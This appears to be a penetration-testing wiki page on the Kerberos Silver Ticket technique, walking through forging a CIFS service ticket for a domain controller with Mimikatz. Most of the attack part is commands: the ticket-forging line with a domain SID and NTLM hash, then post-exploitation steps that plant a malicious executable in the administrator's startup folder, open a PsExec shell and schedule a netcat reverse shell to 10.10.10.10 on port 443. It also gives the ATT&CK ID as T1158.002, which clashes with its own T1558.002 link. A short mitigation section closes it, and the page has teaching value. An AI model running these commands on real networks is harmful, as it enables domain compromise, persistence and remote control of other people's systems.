---
description: https://attack.mitre.org/techniques/T1558/002/
---

# Silver Ticket

**ATT\&CK ID:** [T1158.002](https://attack.mitre.org/techniques/T1558/002/)

**Permissions Required:** <mark style="color:green;">**User**</mark>

**Description**

Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.

### Notes

* Silver ticket is a valid TGS where a Golden ticket is a TGT
* Encrypted and signed by the NTLM hash of the service account
* Services only allow access to the services themselves

## Techniques

### Mimikatz (Scenario)

* Domain Controller **(DC01)**
* Workstation **(Workstation-01)**

This scenario assumes compromise where the computer account hash for DC01$ has already been revealed through one of the many methods found in this [**Link**](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/golden-ticket#methods-of-krbtgt-hash-retrieval).

Here we are running as the local administrator on the **Workstation-01** system. Attempting to list the directory contents of C$ on the Domain Controller shows we are unable to do so (the local administrator has no permission over the C: drive on the DC).

![](<../../../../.gitbook/assets/image (2029).png>)

From the workstation we are able to make use of Mimikatz to forge a silver ticket using the NTLM machine account for the DC.

```bash
# Mimikatz
kerberos::golden /domain:security.local /sid:S-1-5-21-4138410741-468136197-2756728127 /target:dc01.security.local /service:CIFS /rc4:e4b5e471621119551fcf3feb9940efe1 /user:administrator /ptt
```

#### Command Breakdown

| Switch           | Description                             |
| ---------------- | --------------------------------------- |
| kerberos::golden | Module name                             |
| /domain:         | Domain FQDN                             |
| /sid:            | Domain SID                              |
| /target:         | Target FQDN                             |
| /service:        | SPN name of service to create TGS for   |
| /rc4:            | NTLM hash of the service account (DC01) |
| /user:           | Username for which the TGT is generated |
| /ptt             | Injects ticket into current process     |

![](<../../../../.gitbook/assets/image (2030).png>)

Now the ticket has been created and injected into the current process (/ptt) we can use the command below to open a new command prompt from Mimikatz whilst retaining the ticket.

```bash
misc::cmd
```

We are then able to list the C$ share of the Domain Controller.

```bash
dir \\dc01.security.local\c$
```

![](<../../../../.gitbook/assets/image (2031).png>)

Some examples commands which can now be performed on the domain controller

```bash
# Map drive
net use Z: \\dc01.security.local\C$

# Copy malware to Domain Administrator startup folder on DC
copy .\MaliciousFile.exe "\\dc01.security.local\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# CMD 
.\PsExec.exe -accepteula \\dc01.security.local cmd

# Netcat
schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\Administrator\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'
```

### Empire

```
# PowerShell
powershell/credentials/mimikatz/silver_ticket
```

## Mitigation

Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.

If possible use [group managed service accounts](https://technet.microsoft.com/en-us/library/hh831782\(v=ws.11\).aspx?f=255\&MSPPError=-2147217396) which have random, complex passwords (>100 characters) and are managed automatically by Active Directory [\[source\]](https://adsecurity.org/?p=2293)

## References

{% embed url="https://adsecurity.org/?p=2011" %}
